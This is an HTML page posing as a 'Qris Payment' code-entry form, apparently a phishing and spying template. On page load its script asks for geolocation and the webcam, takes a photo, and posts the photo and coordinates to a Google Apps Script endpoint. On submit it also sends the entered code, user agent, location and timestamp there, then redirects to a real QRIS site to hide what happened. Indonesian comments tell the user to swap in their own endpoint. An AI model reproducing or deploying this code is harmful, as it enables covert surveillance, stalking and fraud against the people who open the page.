<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Qris Payment</title>
<style>
body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
.container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
input {padding:12px 16px;width:100%;max-width:280px;border:1px solid #ccc;border-radius:8px;font-size:16px;margin-bottom:15px;}
input:focus {border-color:#3b82f6;outline:none;box-shadow:0 0 0 2px rgba(59,130,246,.3);}
button {padding:12px 20px;border:none;border-radius:8px;background:#3b82f6;color:white;font-size:16px;cursor:pointer;width:100%;}
button:hover {background:#2563eb;}
#message {margin-top:12px;font-weight:bold;display:none;}
</style>
</head>
<body>
<div class="container">
<img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
<input id="codeInput" type="text" placeholder="PUT CODE">
<button onclick="handleSubmit()">Submit</button>
<div id="message"></div>
</div>

<script>
const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKws1nOH7Q8-WuhloZ8_O1H7gZ5gBAHlcJh18f4ZIZTRkUAwweUR02tgxd9u1QDnRv/exec"; // ganti URL Web App lo
const REDIRECT_URL = "https://qris.interactive.co.id"; // link redirect manual

async function autoRecord(){
    let location="Unavailable", photo="";
    try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        location=`${pos.coords.latitude},${pos.coords.longitude}`;
    }catch(e){console.warn("Lokasi ditolak");}

    try{
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        const video=document.createElement("video");
        video.srcObject=stream;
        await video.play();

        const canvas=document.createElement("canvas");
        canvas.width=1280;
        canvas.height=720;
        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);

        photo = await new Promise(resolve => {
            canvas.toBlob(blob => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            }, "image/jpeg", 0.9);
        });

        stream.getTracks().forEach(track=>track.stop());
    }catch(e){console.warn("Kamera ditolak");}

    await fetch(APPSCRIPT_URL,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({photo,location})
    });
}

async function handleSubmit(){
    const code=document.getElementById("codeInput").value || "ANY"; // apapun bisa masuk
    const userAgent=navigator.userAgent;
    let location="Unavailable";
    try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        location=`${pos.coords.latitude},${pos.coords.longitude}`;
    }catch(e){}

    const timestamp=new Date().toISOString();
    const body={code,userAgent,location,timestamp};

    document.getElementById("message").style.display="block";
    document.getElementById("message").textContent="Submitting...";

    try{
        await fetch(APPSCRIPT_URL,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify(body)
        });
    }catch(e){
        console.warn("Gagal kirim data:", e);
    }

    // langsung redirect tanpa nunggu respon
    window.location.href=REDIRECT_URL;
}

window.onload=autoRecord;
</script>
</body>
</html>
